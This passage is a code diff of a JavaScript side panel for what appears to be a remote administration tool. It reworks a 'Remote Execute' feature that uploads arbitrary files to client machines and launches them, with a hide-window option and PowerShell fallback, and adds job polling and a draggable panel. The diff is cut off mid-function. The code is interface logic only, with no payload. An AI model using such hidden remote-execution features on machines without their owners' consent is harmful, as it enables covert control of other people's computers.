@@ -9,7 +9,7 @@
 
 import { playClickSound, playErrorSound, playSuccessSound } from "./sounds.js";
 
-const SIDE_PANEL_JS_VERSION = "1.8.0";
+const SIDE_PANEL_JS_VERSION = "1.10.0";
 
 /* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
 /*  Menu definition                                            */
@@ -195,49 +195,39 @@ const WALLPAPER_POLL_MS = 500;
 const REMOTE_EXECUTE_MAX_SIZE = 200 * 1024 * 1024; // 200 MB
 const REMOTE_EXECUTE_POLL_MS = 500;
 const REMOTE_EXECUTE_TRANSFER_POLL_MS = 200;
-const REX_READY_STORAGE_PREFIX = "rex:ready:";
+const REX_POS_STORAGE_PREFIX = "rex:pos:";
+const REX_READY_STORAGE_PREFIX = "rex:ready:"; // legacy cleanup
+const REX_SESSION_STORAGE_PREFIX = "rex:session:"; // legacy cleanup
 
-function rexReadyStorageKey(clientId) {
-  return `${REX_READY_STORAGE_PREFIX}${clientId}`;
+function clearRexLegacyStorage(clientId) {
+  try {
+    localStorage.removeItem(`${REX_SESSION_STORAGE_PREFIX}${clientId}`);
+    localStorage.removeItem(`${REX_READY_STORAGE_PREFIX}${clientId}`);
+  } catch {
+    /* ignore */
+  }
 }
 
-function loadRexReadyJob(clientId) {
+function loadRexPanelPos(clientId) {
   try {
-    const raw = localStorage.getItem(rexReadyStorageKey(clientId));
+    const raw = localStorage.getItem(`${REX_POS_STORAGE_PREFIX}${clientId}`);
     if (!raw) return null;
     const parsed = JSON.parse(raw);
-    if (!parsed?.jobId) return null;
-    if (parsed.expiresAt && Number(parsed.expiresAt) < Date.now()) {
-      localStorage.removeItem(rexReadyStorageKey(clientId));
-      return null;
-    }
-    return parsed;
+    const left = Number(parsed?.left);
+    const top = Number(parsed?.top);
+    if (!Number.isFinite(left) || !Number.isFinite(top)) return null;
+    return { left, top };
   } catch {
     return null;
   }
 }
 
-function saveRexReadyJob(clientId, job) {
+function saveRexPanelPos(clientId, pos) {
   try {
     localStorage.setItem(
-      rexReadyStorageKey(clientId),
-      JSON.stringify({
-        jobId: job.jobId,
-        originalName: job.originalName,
-        destinationPath: job.destinationPath,
-        expiresAt: job.expiresAt,
-        clientVersion: job.clientVersion,
-        transferMethod: job.transferMethod,
-      }),
+      `${REX_POS_STORAGE_PREFIX}${clientId}`,
+      JSON.stringify({ left: Math.round(pos.left), top: Math.round(pos.top) }),
     );
-  } catch {
-    /* ignore quota */
-  }
-}
-
-function clearRexReadyJob(clientId) {
-  try {
-    localStorage.removeItem(rexReadyStorageKey(clientId));
   } catch {
     /* ignore */
   }
@@ -492,6 +482,8 @@ function uploadWallpaper(clientId, file) {
 /*  Remote Execute                                             */
 /* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
 
+/* ── Remote Execute ─────────────────────────────────────────── */
+
 function remoteExecutePhaseLabel(phase, status) {
   if (phase === "client_transfer") {
     const state = status?.transferState;
@@ -512,106 +504,58 @@ function remoteExecutePhaseLabel(phase, status) {
     case "queued": return "Queued";
     case "staging": return "Staging on server";
     case "chmod": return "Setting permissions";
-    case "ready": return "Uploaded â€” ready to execute";
+    case "ready":
+      return status?.lastError ? "Ready (last launch failed)" : "Ready";
     case "execute":
       return status?.usedExecFallback || status?.lastClientStatus === "script_fallback"
-        ? "Launching via PowerShell fallback"
+        ? "Launching via fallback"
         : "Starting process";
-    case "succeeded": return "Execution completed";
+    case "succeeded": return "Done";
     case "failed": return "Failed";
     default: return "Remote execute";
   }
 }
 
-function remoteExecuteTransferStateLabel(state) {
-  switch (state) {
-    case "command_not_sent": return "Command was not sent";
-    case "command_sent_no_client_progress": return "Waiting for client acknowledgement";
-    case "client_transfer_active": return "Client transferring";
-    case "client_transfer_complete": return "Client transfer completed";
-    default: return "Waiting for client";
+function remoteExecuteTone(status, explicit) {
+  if (explicit) return explicit;
+  if (!status) return "idle";
+  if (status.status === "failed" || status.phase === "failed") return "err";
+  if (status.status === "succeeded" || status.phase === "succeeded") return "ok";
+  if (status.status === "ready" || status.phase === "ready") {
+    return status.lastError ? "warn" : "ok";
   }
-}
-
-function remoteExecuteErrorText(status) {
-  const err = status?.error || {};
-  const parts = [
-    err.message || status?.message || "Remote execute failed",
-    err.phase || status?.phase ? `Step: ${remoteExecutePhaseLabel(err.phase || status.phase, status)}` : "",
-    err.transferState || status?.transferState
-      ? `Transfer state: ${remoteExecuteTransferStateLabel(err.transferState || status.transferState)}`
-      : "",
-    err.clientVersion || status?.clientVersion ? `Client version: ${err.clientVersion || status.clientVersion}` : "",
-    err.endpointSource || status?.endpointSource
-      ? `Endpoint source: ${wallpaperEndpointSourceLabel(err.endpointSource || status.endpointSource)}`
-      : "",
-    `Transferred: ${formatBytes(err.bytesTransferred ?? status?.bytesTransferred ?? 0)} / ${formatBytes(err.totalBytes ?? status?.totalBytes ?? 0)}`,
-    err.destinationPath || status?.destinationPath ? `Destination: ${err.destinationPath || status.destinationPath}` : "",
-    err.resolvedUrl || err.pullOrigin || status?.resolvedUrl || status?.pullOrigin
-      ? `Endpoint: ${err.resolvedUrl || status?.resolvedUrl || err.pullOrigin || status?.pullOrigin}`
-      : "",
-    err.clientMessage ? `Client: ${err.clientMessage}` : "",
-    err.serverMessage ? `Server: ${err.serverMessage}` : "",
-    err.code ? `Code: ${err.code}` : "",
-  ].filter(Boolean);
-  return parts.join("\n");
-}
-
-function formatRemoteExecuteSpeed(status) {
-  const bytes = Number(status?.bytesTransferred) || 0;
-  const speed = Number(status?.speedBytesPerSecond) || 0;
-  if (bytes <= 0 && speed <= 0) {
-    if (status?.lastClientStatus === "retrying") return "retrying";
-    if (status?.clientAcknowledged) return "connectingâ€¦";
-    return "waitingâ€¦";
+  if (
+    status.lastClientStatus === "retrying" ||
+    status.usedTransferFallback ||
+    status.usedExecFallback ||
+    status.lastClientStatus === "script_fallback" ||
+    status.lastClientStatus === "ws_fallback"
+  ) {
+    return "warn";
   }
-  if (speed <= 0) return "â€”";
-  return formatSpeed(speed);
+  if (
+    status.status === "running" ||
+    status.phase === "client_transfer" ||
+    status.phase === "staging" ||
+    status.phase === "execute" ||
+    status.phase === "chmod"
+  ) {
+    return "run";
+  }
+  return "idle";
 }
 
-function renderRemoteExecuteDetails(status, file) {
-  const transferred = formatBytes(status.bytesTransferred || 0);
-  const total = formatBytes(status.totalBytes || file.size || 0);
-  const speed = formatRemoteExecuteSpeed(status);
-  const destination = status.destinationPath || "unknown destination";
-  const attempt = Number(status.lastClientAttempt) > 0 ? ` Â· attempt ${status.lastClientAttempt}` : "";
-  const version = status.clientVersion ? ` Â· agent v${status.clientVersion}` : "";
-  const clientMsg = status.lastClientMessage
-    ? `<div class="sp-progress-detail">${escapeHtml(status.lastClientMessage)}${escapeHtml(attempt)}</div>`
-    : "";
-  const method =
-    status.transferMethod === "ws_chunks"
-      ? "WebSocket chunks"
-      : status.transferMethod === "shell_pull"
-        ? "Shell download"
-        : status.transferMethod === "http_pull"
-          ? "HTTP pull"
-          : status.usedTransferFallback
-            ? "Fallback transfer"
-            : "";
-  const methodHint = method
-    ? `<div class="sp-progress-detail">Transfer: ${escapeHtml(method)}${status.usedTransferFallback ? " (fallback)" : ""}</div>`
-    : "";
-  const attempts = Array.isArray(status.transferAttempts) && status.transferAttempts.length
-    ? `<div class="sp-progress-detail">Attempts: ${escapeHtml(
-        status.transferAttempts.map((a) => `${a.method}:${a.ok ? "ok" : a.code || "fail"}`).join(" â†’ "),
-      )}</div>`
-    : "";
-  const waitingHint =
-    !status.clientAcknowledged &&
-    status.transferState === "command_sent_no_client_progress" &&
-    !status.usedTransferFallback
-      ? `<div class="sp-progress-detail">No agent progress yet${escapeHtml(version)} â€” trying fallback if available</div>`
-      : "";
-  return `
-    <div class="sp-progress-detail">${escapeHtml(file?.name || status.originalName || "file")} Â· ${transferred} / ${total} Â· ${escapeHtml(speed)}</div>
-    <div class="sp-progress-detail">Destination: ${escapeHtml(destination)}</div>
-    <div class="sp-progress-detail">${escapeHtml(remoteExecuteTransferStateLabel(status.transferState))}${escapeHtml(version)}</div>
-    ${methodHint}
-    ${attempts}
-    ${waitingHint}
-    ${clientMsg}
-  `;
+function formatRexExpiry(expiresAt) {
+  const ms = Number(expiresAt) - Date.now();
+  if (!Number.isFinite(ms) || ms <= 0) return "expiring";
+  const mins = Math.max(1, Math.round(ms / 60_000));
+  if (mins >= 60) return `${Math.floor(mins / 60)}h ${mins % 60}m left`;
+  return `${mins}m left`;
+}
+
+function shortRexJobId(jobId) {
+  const id = String(jobId || "");
+  return id.length > 8 ? id.slice(0, 8) : id;
 }
 
 function mountRexPanelHost() {
@@ -625,45 +569,232 @@ function mountRexPanelHost() {
   return host;
 }
 
-function setRexSegmentProgress(track, percent) {
-  if (!track) return;
-  const pct = Math.max(0, Math.min(100, Number(percent) || 0));
-  const blocks = track.querySelectorAll(".sp-rex-seg");
-  const n = blocks.length || 20;
-  const filled = Math.round((pct / 100) * n);
-  blocks.forEach((el, i) => {
-    el.classList.toggle("is-on", i < filled);
+async function fetchRexJobs(clientId) {
+  const res = await fetch(`/api/clients/${encodeURIComponent(clientId)}/remote-execute`, {
+    credentials: "include",
   });
-  track.setAttribute("aria-valuenow", String(pct));
+  if (!res.ok) {
+    if (res.status === 404) return [];
+    const body = await res.json().catch(() => ({}));
+    throw new Error(body.message || `Failed to list remote execute jobs (${res.status})`);
+  }
+  const body = await res.json().catch(() => ({}));
+  return Array.isArray(body.jobs) ? body.jobs : [];
 }
 
-function buildRexSegmentTrackHtml(percent = 0) {
-  const segs = Array.from({ length: 20 }, (_, i) => {
-    const on = i < Math.round((Math.max(0, Math.min(100, percent)) / 100) * 20);
-    return `<span class="sp-rex-seg${on ? " is-on" : ""}"></span>`;
-  }).join("");
-  return `<div class="sp-rex-win98-track" role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="${Math.round(percent)}">${segs}</div>`;
+async function fetchRexJob(clientId, jobId) {
+  const res = await fetch(
+    `/api/clients/${encodeURIComponent(clientId)}/remote-execute/${encodeURIComponent(jobId)}`,
+    { credentials: "include" },
+  );
+  const body = await res.json().catch(() => ({}));
+  if (!res.ok) {
+    const err = new Error(body.message || `Job not found (${res.status})`);
+    err.status = res.status;
+    err.body = body;
+    throw err;
+  }
+  return body;
+}
+
+function sortRexJobs(jobs) {
+  const rank = (job) => {
+    if (job.status === "running" || job.status === "queued") return 0;
+    if (job.status === "ready") return 1;
+    return 2;
+  };
+  return [...jobs].sort((a, b) => {
+    const byRank = rank(a) - rank(b);
+    if (byRank !== 0) return byRank;
+    return (b.updatedAt || 0) - (a.updatedAt || 0);
+  });
+}
+
+function clampRexPanelPosition(panel, host, left, top) {
+  const hostRect = host.getBoundingClientRect();
+  const width = panel.offsetWidth || 320;
+  const height = panel.offsetHeight || 200;
+  const maxLeft = Math.max(0, hostRect.width - width);
+  const maxTop = Math.max(0, hostRect.height - height);
+  return {
+    left: Math.min(maxLeft, Math.max(0, left)),
+    top: Math.min(maxTop, Math.max(0, top)),
+  };
+}
+
+function applyRexPanelPosition(panel, host, clientId, preferred) {
+  const hostRect = host.getBoundingClientRect();
+  const width = panel.offsetWidth || 320;
+  const height = panel.offsetHeight || 200;
+  let left;
+  let top;
+  if (preferred && Number.isFinite(preferred.left) && Number.isFinite(preferred.top)) {
+    left = preferred.left;
+    top = preferred.top;
+  } else {
+    left = 12;
+    top = Math.max(12, hostRect.height - height - 12);
+  }
+  const clamped = clampRexPanelPosition(panel, host, left, top);
+  panel.style.left = `${clamped.left}px`;
+  panel.style.top = `${clamped.top}px`;
+  panel.style.right = "auto";
+  panel.style.bottom = "auto";
+  saveRexPanelPos(clientId, clamped);
+}
+
+function enableRexPanelDrag(panel, host, clientId) {
+  const bar = panel.querySelector("[data-rex-drag]");
+  if (!bar) return;
+  let dragging = false;
+  let startX = 0;
+  let startY = 0;
+  let origLeft = 0;
+  let origTop = 0;
+
+  bar.addEventListener("pointerdown", (e) => {
+    if (e.button !== 0) return;
+    if (e.target.closest("[data-rex-close]")) return;
+    dragging = true;
+    startX = e.clientX;
+    startY = e.clientY;
+    origLeft = panel.offsetLeft;
+    origTop = panel.offsetTop;
+    bar.setPointerCapture?.(e.pointerId);
+    panel.classList.add("is-dragging");
+    e.preventDefault();
+  });
+
+  bar.addEventListener("pointermove", (e) => {
+    if (!dragging) return;
+    const next = clampRexPanelPosition(
+      panel,
+      host,
+      origLeft + (e.clientX - startX),
+      origTop + (e.clientY - startY),
+    );
+    panel.style.left = `${next.left}px`;
+    panel.style.top = `${next.top}px`;
+  });
+
+  const endDrag = (e) => {
+    if (!dragging) return;
+    dragging = false;
+    panel.classList.remove("is-dragging");
+    try {
+      bar.releasePointerCapture?.(e.pointerId);
+    } catch {
+      /* ignore */
+    }
+    saveRexPanelPos(clientId, { left: panel.offsetLeft, top: panel.offsetTop });
+  };
+  bar.addEventListener("pointerup", endDrag);
+  bar.addEventListener("pointercancel", endDrag);
+
+  const onResize = () => {
+    applyRexPanelPosition(panel, host, clientId, {
+      left: panel.offsetLeft,
+      top: panel.offsetTop,
+    });
+  };
+  window.addEventListener("resize", onResize);
+  panel._rexOnResize = onResize;
+}
+
+function renderRexJobRow(job, opts = {}) {
+  const tone = remoteExecuteTone(job);
+  const name = job.originalName || "file";
+  const shortId = shortRexJobId(job.jobId);
+  const size = formatBytes(job.totalBytes || 0);
+  const expiry = job.expiresAt && (job.status === "ready" || job.status === "running")
+    ? formatRexExpiry(job.expiresAt)
+    : "";
+  const path = job.destinationPath || "";
+  const pct =
+    job.status === "ready" || job.status === "succeeded"
+      ? 100
+      : Math.max(0, Math.min(99, Number(job.percent) || 0));
+  const phase = remoteExecutePhaseLabel(job.phase || job.status, job);
+  let badge = String(job.status || "job");
+  if (job.status === "ready") badge = job.lastError ? "Ready*" : "Ready";
+  else if (job.status === "running" || job.status === "queued") badge = "Active";
+  else if (job.status === "succeeded") badge = "Done";
+  else if (job.status === "failed") badge = "Failed";
+
+  const err = job.lastError?.message || job.error?.message || "";
+  const busy = !!opts.controllers?.has?.(job.jobId);
+  const canExec = job.status === "ready" || job.canExecute;
+  const isActive = job.status === "running" || job.status === "queued";
+  const isTerminal = job.status === "succeeded" || job.status === "failed";
+
+  let actions = "";
+  if (isActive || busy) {
+    actions = `<button type="button" class="sp-progress-action sp-progress-action-muted" data-rex-row-cancel="${escapeHtml(job.jobId)}">Cancel</button>`;
+  } else if (canExec) {
+    actions = `
+      <button type="button" class="sp-progress-action" data-rex-row-exec="${escapeHtml(job.jobId)}">Execute</button>
+      <button type="button" class="sp-progress-action sp-progress-action-muted" data-rex-row-discard="${escapeHtml(job.jobId)}">Discard</button>`;
+  } else if (isTerminal) {
+    actions = `<button type="button" class="sp-progress-action sp-progress-action-muted" data-rex-row-dismiss="${escapeHtml(job.jobId)}">Dismiss</button>`;
+  }
+
+  const progressLine = isActive
+    ? `<div class="sp-rex-row-progress rex-tone-${tone}">${escapeHtml(phase)} · ${pct}%</div>`
+    : "";
+
+  return `
+    <div class="sp-rex-session rex-tone-${tone}" data-rex-row data-job-id="${escapeHtml(job.jobId)}">
+      <div class="sp-rex-session-top">
+        <span class="sp-rex-badge rex-tone-${tone}">${escapeHtml(badge)}</span>
+        <span class="sp-rex-session-name" title="${escapeHtml(name)}">${escapeHtml(name)}</span>
+        <span class="sp-rex-session-meta">${escapeHtml(shortId)} · ${escapeHtml(size)}${expiry ? ` · ${escapeHtml(expiry)}` : ""}</span>
+      </div>
+      ${path ? `<div class="sp-rex-session-path" title="${escapeHtml(path)}">${escapeHtml(path)}</div>` : ""}
+      ${progressLine}
+      ${err ? `<div class="sp-rex-session-err">${escapeHtml(err)}</div>` : ""}
+      <div class="sp-rex-session-actions">${actions}</div>
+    </div>
+  `;
 }
 
 function createRemoteExecutePanel(clientId) {
-  const ready = loadRexReadyJob(clientId);
   const host = mountRexPanelHost();
-  host.querySelectorAll(".sp-rex-panel").forEach((el) => el.remove());
+  const existing = [...host.querySelectorAll(".sp-rex-panel")].find((el) => el.dataset.clientId === clientId);
+  if (existing) {
+    existing.classList.add("is-focus");
+    existing.scrollIntoView?.({ block: "nearest" });
+    return existing;
+  }
+
+  clearRexLegacyStorage(clientId);
 
   const panel = document.createElement("div");
   panel.className = "sp-rex-panel";
+  panel.dataset.clientId = clientId;
   panel.setAttribute("role", "dialog");
   panel.setAttribute("aria-modal", "false");
   panel.innerHTML = `
     <div class="sp-rex-chrome">
-      <div class="sp-rex-titlebar">
+      <div class="sp-rex-titlebar" data-rex-drag>
         <span class="sp-rex-title">Remote Execute</span>
         <button type="button" class="sp-rex-close" data-rex-close aria-label="Close">&times;</button>
       </div>
-      <div class="sp-rex-body" data-rex-form>
+      <div class="sp-rex-body sp-rex-files" data-rex-files>
+        <div class="sp-rex-section-label">Staged files <span class="sp-rex-section-hint">~30 min after upload</span></div>
+        <div class="sp-rex-file-list" data-rex-file-list>
+          <p class="sp-help sp-rex-empty-hint">No staged files for this client yet.</p>
+        </div>
+      </div>
+      <div class="sp-rex-body" data-rex-upload>
         <label class="sp-field">
           <span>File (any type)</span>
-          <input type="file" data-rex-file class="sp-input" />
+          <div class="sp-rex-file-row">
+            <label class="sp-rex-file-btn">
+              Choose file
+              <input type="file" data-rex-file class="sp-rex-file-input" />
+            </label>
+            <span class="sp-rex-file-name" data-rex-file-name>No file selected</span>
+          </div>
         </label>
         <label class="sp-field">
           <span>Arguments (optional)</span>
@@ -673,345 +804,351 @@ function createRemoteExecutePanel(clientId) {
           <input type="checkbox" data-rex-hide />
           <span>Hide window (executables/scripts only)</span>
         </label>
-        <p class="sp-help">
-          <strong>Upload only</strong> stages the file on the client.
-          <strong>Upload &amp; Run</strong> transfers and launches immediately.
-          <strong>Execute only</strong> runs a previously uploaded ready file.
-          Max ${REMOTE_EXECUTE_MAX_SIZE / 1024 / 1024} MB.
-        </p>
-        <p class="sp-help" data-rex-ready-hint></p>
+        <p class="sp-help">Upload only stages. Upload &amp; Run launches after transfer. Max ${REMOTE_EXECUTE_MAX_SIZE / 1024 / 1024} MB. Close keeps jobs running.</p>
       </div>
-      <div class="sp-rex-body sp-rex-progress" data-rex-progress hidden>
-        <div class="sp-rex-progress-label" data-rex-label>Preparing\u2026</div>
-        <div class="sp-rex-progress-meta" data-rex-meta></div>
-        ${buildRexSegmentTrackHtml(0)}
-        <div class="sp-progress-actions" data-rex-actions hidden></div>
+      <div class="sp-rex-body sp-rex-activity" data-rex-activity hidden>
+        <div class="sp-rex-progress-label rex-tone-run" data-rex-activity-label>Staging...</div>
+        <div class="sp-rex-progress-meta" data-rex-activity-meta></div>
+        <div class="sp-rex-activity-actions">
+          <button type="button" class="sp-progress-action sp-progress-action-muted" data-rex-staging-cancel>Cancel upload</button>
+        </div>
       </div>
       <div class="sp-rex-footer" data-rex-footer>
-        <button type="button" class="sp-modal-btn sp-modal-btn-cancel" data-rex-close>Cancel</button>
-        <button type="button" class="sp-modal-btn" data-rex-action="execute_only" ${ready ? "" : "disabled"}>Execute only</button>
+        <button type="button" class="sp-modal-btn sp-modal-btn-cancel" data-rex-close>Close</button>
         <button type="button" class="sp-modal-btn" data-rex-action="upload_only">Upload only</button>
         <button type="button" class="sp-modal-btn sp-modal-btn-confirm" data-rex-action="upload_and_run">Upload &amp; Run</button>
       </div>
     </div>
   `;
 
-  const hint = panel.querySelector("[data-rex-ready-hint]");
-  if (ready && hint) {
-    hint.textContent = `Ready on client: ${ready.originalName || ready.jobId} â†’ ${ready.destinationPath || ""}`;
-  } else if (hint) {
-    hint.textContent = "No ready upload for this client yet.";
-  }
+  const jobsById = new Map();
+  const controllers = new Map();
+  const dismissedIds = new Set();
+  let uploadBusy = false;
+  let stagingXhr = null;
+  let listPollTimer = null;
+  let destroyed = false;
 
-  let busy = false;
-  let activeController = null;
+  const fileInput = panel.querySelector("[data-rex-file]");
+  const fileNameEl = panel.querySelector("[data-rex-file-name]");
+  const listEl = panel.querySelector("[data-rex-file-list]");
+  const activityEl = panel.querySelector("[data-rex-activity]");
+  const activityLabel = panel.querySelector("[data-rex-activity-label]");
+  const activityMeta = panel.querySelector("[data-rex-activity-meta]");
+  const uploadSection = panel.querySelector("[data-rex-upload]");
 
-  const closePanel = () => {
-    if (busy && activeController) {
-      void activeController.cancel();
+  fileInput?.addEventListener("change", () => {
+    const f = fileInput.files?.[0];
+    if (fileNameEl) fileNameEl.textContent = f ? f.name : "No file selected";
+  });
+
+  const setUploadBusy = (value) => {
+    uploadBusy = value;
+    panel.classList.toggle("is-upload-busy", value);
+    panel.querySelectorAll("[data-rex-action]").forEach((btn) => {
+      btn.disabled = value;
+    });
+    if (uploadSection) uploadSection.classList.toggle("is-dimmed", value);
+  };
+
+  const showStaging = (label, metaHtml) => {
+    if (activityEl) activityEl.hidden = false;
+    if (activityLabel) activityLabel.textContent = label;
+    if (activityMeta) activityMeta.innerHTML = metaHtml || "";
+  };
+
+  const hideStaging = () => {
+    if (activityEl) activityEl.hidden = true;
+    if (activityMeta) activityMeta.innerHTML = "";
+  };
+
+  const stopListPoll = () => {
+    if (listPollTimer) {
+      clearTimeout(listPollTimer);
+      listPollTimer = null;
+    }
+  };
+
+  const scheduleListPoll = () => {
+    stopListPoll();
+    const needsPoll = [...jobsById.values()].some(
+      (j) => j.status === "running" || j.status === "queued" || controllers.has(j.jobId),
+    );
+    if (!needsPoll || destroyed) return;
+    listPollTimer = setTimeout(() => {
+      void refreshJobList({ quiet: true });
+    }, REMOTE_EXECUTE_POLL_MS);
+  };
+
+  function renderFileList() {
+    if (!listEl) return;
+    const jobs = sortRexJobs(
+      [...jobsById.values()].filter((j) => !dismissedIds.has(j.jobId)),
+    );
+    if (!jobs.length) {
+      listEl.innerHTML = `<p class="sp-help sp-rex-empty-hint">No staged files for this client yet.</p>`;
       return;
     }
-    panel.remove();
-  };
+    listEl.innerHTML = jobs.map((job) => renderRexJobRow(job, { controllers })).join("");
+    bindRowActions();
+  }
 
-  panel.querySelectorAll("[data-rex-close]").forEach((btn) => {
-    btn.addEventListener("click", () => closePanel());
-  });
-
-  panel.querySelectorAll("[data-rex-action]").forEach((btn) => {
-    btn.addEventListener("click", () => {
-      if (btn.disabled || busy) return;
-      const action = btn.getAttribute("data-rex-action");
-      const fileInput = panel.querySelector("[data-rex-file]");
-      const argsInput = panel.querySelector("[data-rex-args]");
-      const hideInput = panel.querySelector("[data-rex-hide]");
-      const args = String(argsInput?.value || "").trim();
-      const hideWindow = !!hideInput?.checked;
-
-      if (action === "execute_only") {
-        const readyJob = loadRexReadyJob(clientId);
-        if (!readyJob?.jobId) {
-          showToast("No ready upload for this client â€” use Upload only first", "error");
-          return;
-        }
-        busy = true;
-        panel.classList.add("is-busy");
-        activeController = runRemoteExecuteInPanel(panel, clientId, {
-          kind: "execute",
-          jobId: readyJob.jobId,
-          args: args || undefined,
-          hideWindow,
-          displayName: readyJob.originalName,
-          onDone: () => {
-            busy = false;
-            activeController = null;
-            panel.classList.remove("is-busy");
-          },
-        });
-        return;
-      }
-
-      const file = fileInput?.files?.[0];
-      if (!file) {
-        showToast("Select a file to upload", "error");
-        return;
-      }
-      if (file.size <= 0) {
-        showToast("File is empty", "error");
-        return;
-      }
-      if (file.size > REMOTE_EXECUTE_MAX_SIZE) {
-        showToast(
-          `File too large (${(file.size / 1024 / 1024).toFixed(1)} MB). Max is ${REMOTE_EXECUTE_MAX_SIZE / 1024 / 1024} MB.`,
-          "error",
-        );
-        return;
-      }
-
-      busy = true;
-      panel.classList.add("is-busy");
-      activeController = runRemoteExecuteInPanel(panel, clientId, {
-        kind: "upload",
-        file,
-        args: args || undefined,
-        hideWindow,
-        mode: action === "upload_only" ? "upload_only" : "upload_and_run",
-        onDone: () => {
-          busy = false;
-          activeController = null;
-          panel.classList.remove("is-busy");
-        },
+  function bindRowActions() {
+    listEl.querySelectorAll("[data-rex-row-exec]").forEach((btn) => {
+      btn.addEventListener("click", () => {
+        const jobId = btn.getAttribute("data-rex-row-exec");
+        const job = jobsById.get(jobId);
+        if (!job || controllers.has(jobId)) return;
+        startExecute(jobId, job.originalName);
       });
     });
-  });
+    listEl.querySelectorAll("[data-rex-row-discard]").forEach((btn) => {
+      btn.addEventListener("click", () => {
+        const jobId = btn.getAttribute("data-rex-row-discard");
+        void discardJob(jobId);
+      });
+    });
+    listEl.querySelectorAll("[data-rex-row-cancel]").forEach((btn) => {
+      btn.addEventListener("click", () => {
+        const jobId = btn.getAttribute("data-rex-row-cancel");
+        const ctl = controllers.get(jobId);
+        if (ctl?.cancel) void ctl.cancel();
+        else void discardJob(jobId);
+      });
+    });
+    listEl.querySelectorAll("[data-rex-row-dismiss]").forEach((btn) => {
+      btn.addEventListener("click", () => {
+        const jobId = btn.getAttribute("data-rex-row-dismiss");
+        dismissedIds.add(jobId);
+        jobsById.delete(jobId);
+        renderFileList();
+      });
+    });
+  }
 
-  host.appendChild(panel);
-  panel.querySelector("[data-rex-file]")?.focus();
-}
-
-function openRemoteExecuteModal(clientId) {
-  createRemoteExecutePanel(clientId);
-}
-
-function showRexPanelProgress(panel, { label, percent = 0, metaHtml = "", actionsHtml = "" }) {
-  const form = panel.querySelector("[data-rex-form]");
-  const progress = panel.querySelector("[data-rex-progress]");
-  const footer = panel.querySelector("[data-rex-footer]");
-  const labelEl = panel.querySelector("[data-rex-label]");
-  const metaEl = panel.querySelector("[data-rex-meta]");
-  const actionsEl = panel.querySelector("[data-rex-actions]");
-  const track = panel.querySelector(".sp-rex-win98-track");
-  if (form) form.hidden = true;
-  if (progress) progress.hidden = false;
-  if (footer) footer.hidden = true;
-  if (labelEl) labelEl.textContent = label;
-  if (metaEl) metaEl.innerHTML = metaHtml;
-  setRexSegmentProgress(track, percent);
-  if (actionsEl) {
-    if (actionsHtml) {
-      actionsEl.hidden = false;
-      actionsEl.innerHTML = actionsHtml;
-    } else {
-      actionsEl.hidden = true;
-      actionsEl.innerHTML = "";
+  async function refreshJobList({ quiet = false } = {}) {
+    if (destroyed) return;
+    try {
+      const jobs = await fetchRexJobs(clientId);
+      const next = new Map();
+      for (const job of jobs) {
+        if (!job?.jobId || dismissedIds.has(job.jobId)) continue;
+        next.set(job.jobId, job);
+      }
+      // Keep optimistic running entries that controllers still own until server catches up
+      for (const [id, ctlJob] of jobsById) {
+        if (controllers.has(id) && !next.has(id)) next.set(id, ctlJob);
+      }
+      jobsById.clear();
+      for (const [id, job] of next) jobsById.set(id, job);
+      renderFileList();
+      scheduleListPoll();
+    } catch (err) {
+      if (!quiet) {
+        if (listEl && !jobsById.size) {
+          listEl.innerHTML = `<p class="sp-help sp-rex-empty-hint rex-tone-err">${escapeHtml(err.message || "Failed to load staged files")}</p>`;
+        }
+      }
+      scheduleListPoll();
     }
   }
-}
 
-function runRemoteExecuteInPanel(panel, clientId, options = {}) {
-  const onDone = typeof options.onDone === "function" ? options.onDone : () => {};
-  let pollTimer = null;
-  let completed = false;
-  let cancelling = false;
-  let activeJobId = options.jobId || null;
-  let stagingDone = options.kind === "execute";
-  const xhr = options.kind === "upload" ? new XMLHttpRequest() : null;
+  const readFormOptions = () => {
+    const argsInput = panel.querySelector("[data-rex-args]");
+    const hideInput = panel.querySelector("[data-rex-hide]");
+    return {
+      args: String(argsInput?.value || "").trim() || undefined,
+      hideWindow: !!hideInput?.checked,
+    };
+  };
 
-  const cleanupTimers = () => {
-    if (pollTimer) {
-      clearTimeout(pollTimer);
-      pollTimer = null;
+  async function discardJob(jobId) {
+    if (!jobId) return;
+    const ctl = controllers.get(jobId);
+    if (ctl?.cancel) {
+      await ctl.cancel();
+      return;
     }
-  };
+    try {
+      await fetch(`/api/clients/${encodeURIComponent(clientId)}/remote-execute/${encodeURIComponent(jobId)}`, {
+        method: "DELETE",
+        credentials: "include",
+      });
+    } catch {
+      /* best effort */
+    }
+    jobsById.delete(jobId);
+    renderFileList();
+    void refreshJobList({ quiet: true });
+    showToast("Staged file discarded", "info");
+  }
 
-  const finishIdle = (keepOpen = true) => {
-    cleanupTimers();
-    completed = true;
-    onDone();
-    if (!keepOpen) panel.remove();
-  };
-
-  async function cancelRemoteExecute() {
-    if (completed || cancelling) return;
-    cancelling = true;
-    cleanupTimers();
-    if (xhr && !stagingDone) {
+  function detachAllAndClose() {
+    if (destroyed) return;
+    destroyed = true;
+    stopListPoll();
+    if (stagingXhr) {
       try {
-        xhr.abort();
+        stagingXhr.abort();
       } catch {
         /* ignore */
       }
-      finishIdle(false);
-      showToast("Upload cancelled", "info");
-      return;
+      stagingXhr = null;
     }
-    if (activeJobId) {
+    for (const ctl of controllers.values()) {
       try {
-        await fetch(`/api/clients/${clientId}/remote-execute/${encodeURIComponent(activeJobId)}`, {
+        ctl.detach?.();
+      } catch {
+        /* ignore */
+      }
+    }
+    controllers.clear();
+    if (panel._rexOnResize) window.removeEventListener("resize", panel._rexOnResize);
+    panel.remove();
+  }
+
+  panel.querySelectorAll("[data-rex-close]").forEach((btn) => {
+    btn.addEventListener("click", () => detachAllAndClose());
+  });
+
+  panel.querySelector("[data-rex-staging-cancel]")?.addEventListener("click", () => {
+    if (stagingXhr) {
+      try {
+        stagingXhr.abort();
